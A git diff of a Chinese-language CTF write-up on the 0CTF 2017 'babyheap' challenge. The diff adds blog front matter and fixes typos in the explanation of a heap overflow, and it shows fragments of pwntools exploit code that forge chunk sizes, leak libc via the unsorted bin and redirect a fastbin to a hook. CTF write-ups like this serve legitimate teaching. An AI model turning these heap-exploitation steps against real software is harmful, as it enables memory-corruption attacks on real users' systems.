@@ -1,3 +1,9 @@
+---
+redirect_from: /_posts/2018-07-03-%E8%AF%91%E7%A0%81%E6%98%BE%E7%A4%BA%E7%94%B5%E8%B7%AF/
+title: fastbin attack
+tags: pwn
+---
+
 ## 前言
 
 `2017 0ctfd的babyheap`    
@@ -74,9 +80,9 @@ __int64 __fastcall fill(__int64 addr)
 }
 ```
 
-很明显的漏洞，输入内容时第二个参数应该传入`*(_QWORD *)(24LL * index1 + addr + 8)`而不是用户输入的程度
+很明显的漏洞，输入内容时第二个参数应该传入`*(_QWORD *)(24LL * index1 + addr + 8)`而不是用户输入的size
 
-其他函数看看就行，都是堆体很经典的菜单函数
+其他函数看看就行，都是堆题很经典的菜单函数
 
 ## 思路
 开了pie那么就要想办法泄露libc，此时就要想办法构造unsorted bin攻击(heap中目前只学了这一种泄露libc的方法)，因为可以任意构造数据，所以就想办法把fastbin ptr劫持到hook处打one gadget。但是因为这里把free的指针清空了所以需要再拿一个chunk ptr 指到我们构造的chunk处。所以实现步骤如下:
@@ -119,8 +125,6 @@ fill(0, payload)
 payload = p64(0)*3
 payload += p64(0x21)
 fill(3, payload)
-
-
 alloc(0x10)
 alloc(0x10)
 ```
@@ -132,11 +136,7 @@ alloc(0x10)
 payload = p64(0)*3
 payload += p64(0x91)
 fill(3, payload)
-
-
 alloc(0x80)
-
-
 free(4)
 show(2)
 ```
